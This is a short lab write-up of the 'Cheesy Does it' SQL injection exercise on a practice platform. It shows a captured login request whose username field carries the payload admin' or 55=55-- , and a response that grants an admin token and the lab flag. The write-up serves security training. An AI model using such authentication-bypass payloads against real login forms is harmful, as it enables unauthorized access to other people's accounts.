---
title: "Cheesy Does it SQL Injection Authentication Bypass"
date: 2025-11-30
author: Shawn Szczepkowski
---

Today we will be covering the Cheesy Does it SQL Injection lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

We know todays lab is SQL Injection but as usual we don't know where. After registering a user and exploring the sites functionality I was not getting a hit on anything. 

When looking for SQL Injection in labs like this, I tend to look at the login last. It appears I should have started there first.

Let's send some simple payloads that evaluate to true first and see if we get any type of error or alteration in response.

I'll start with a simple one in the username field:
```sh
POST /api/login HTTP/2
Host: cc33386d68f0.labs.bugforge.io
Content-Length: 55
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Origin: https://cc33386d68f0.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://cc33386d68f0.labs.bugforge.io/login
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"username":"admin' or 55=55-- ","password":"admin123"}
```

And it looks like that's all it took to get our flag today. A nice reminder to never skip the easy stuff:
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Sat, 29 Nov 2025 22:00:33 GMT
Etag: W/"193-jItDR3UNKyozEBEllwhHrrm8lCU"
X-Powered-By: Express
Content-Length: 403

{
    "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc2NDQ1MzYzM30.4QaaL6hL3QtZ0KTIziy1I2qqNxyA2m2EA3MFf6bDUfE","user":{
    "id":1,
    "username":"admin",
    "email":"admin@cheesedoesit.com",
    "full_name":"Pizza Admin",
    "phone":"555-0100",
    "address":"123 Main St, Pizza City, PC 12345",
    "role":"admin"
  },
  "success":"Welcome back, admin! Flag: bug{a5106f0cd1373891926db2ae2e9348f8}"
}
```
